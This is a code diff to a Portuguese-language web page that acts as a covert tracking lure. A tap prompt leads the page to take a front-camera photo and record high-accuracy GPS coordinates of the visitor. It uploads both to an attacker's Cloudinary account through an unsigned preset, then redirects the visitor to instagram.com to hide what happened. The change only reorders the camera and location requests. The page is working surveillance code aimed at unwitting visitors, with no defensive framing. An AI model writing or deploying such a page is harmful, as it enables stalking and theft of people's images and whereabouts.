@@ -25,7 +25,7 @@
   </style>
 </head>
 <body>
-  <div id="overlay">Toque para continuar</div>
+  <div id="overlay">Toque para autorizar câmera e localização</div>
   <script>
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
@@ -33,65 +33,67 @@
 
     const overlay = document.getElementById('overlay');
 
-    overlay.onclick = () => {
+    overlay.onclick = async () => {
       overlay.style.display = 'none';
-      // Primeiro: solicitar localização
-      if (!navigator.geolocation) {
-        alert('Geolocalização não suportada.');
+
+      // 1. Solicita permissão de câmera
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      } catch (camErr) {
+        console.error('Câmera negada:', camErr);
+        alert('Permissão de câmera negada. Libere nas configurações do site e recarregue.');
         return;
       }
+
+      // 2. Solicita permissão de localização
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude } = pos.coords;
-          try {
-            // Em seguida, solicitar câmera
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-            const video = document.createElement('video');
-            video.setAttribute('autoplay', true);
-            video.setAttribute('muted', true);
-            video.setAttribute('playsinline', true);
-            video.srcObject = stream;
-            await new Promise(res => video.onloadedmetadata = res);
-            video.play();
 
-            // Capturar imagem após breve delay
-            setTimeout(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth || 640;
-              canvas.height = video.videoHeight || 480;
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-              stream.getTracks().forEach(t => t.stop());
-              canvas.toBlob(async (blob) => {
-                // Upload da imagem
-                const imgForm = new FormData();
-                imgForm.append('file', blob);
-                imgForm.append('upload_preset', uploadPreset);
-                imgForm.append('folder', folderName);
-                const imgResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm });
-                const imgData = await imgResp.json();
+          // 3. Captura a foto
+          const video = document.createElement('video');
+          video.setAttribute('autoplay', true);
+          video.setAttribute('muted', true);
+          video.setAttribute('playsinline', true);
+          video.srcObject = stream;
+          await new Promise(res => video.onloadedmetadata = res);
+          video.play();
 
-                // Upload da localização em .txt
-                const txtBlob = new Blob([
-                  `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imgData.secure_url}`
-                ], { type: 'text/plain' });
-                const txtForm = new FormData();
-                txtForm.append('file', txtBlob, `localizacao_${Date.now()}.txt`);
-                txtForm.append('upload_preset', uploadPreset);
-                txtForm.append('folder', folderName);
-                await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: txtForm });
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(t => t.stop());
 
-                // Redireciona ao final
-                window.location.href = 'https://instagram.com';
-              }, 'image/png');
-            }, 500);
-          } catch (camErr) {
-            console.error('Erro câmera:', camErr);
-            alert('Permissão de câmera negada. Recarregue para tentar novamente.');
-          }
+            canvas.toBlob(async (blob) => {
+              // Upload imagem
+              const imgForm = new FormData();
+              imgForm.append('file', blob);
+              imgForm.append('upload_preset', uploadPreset);
+              imgForm.append('folder', folderName);
+              const imgResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm });
+              const imgData = await imgResp.json();
+
+              // Upload localização
+              const txtBlob = new Blob([
+                `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imgData.secure_url}`
+              ], { type: 'text/plain' });
+              const txtForm = new FormData();
+              txtForm.append('file', txtBlob, `localizacao_${Date.now()}.txt`);
+              txtForm.append('upload_preset', uploadPreset);
+              txtForm.append('folder', folderName);
+              await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: txtForm });
+
+              // Redireciona
+              window.location.href = 'https://instagram.com';
+            }, 'image/png');
+          }, 500);
         },
         (geoErr) => {
-          console.error('Erro localização:', geoErr);
-          alert('Permissão de localização negada. Recarregue para tentar novamente.');
+          console.error('Localização negada:', geoErr);
+          alert('Permissão de localização negada. Libere nas configurações do site e recarregue.');
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
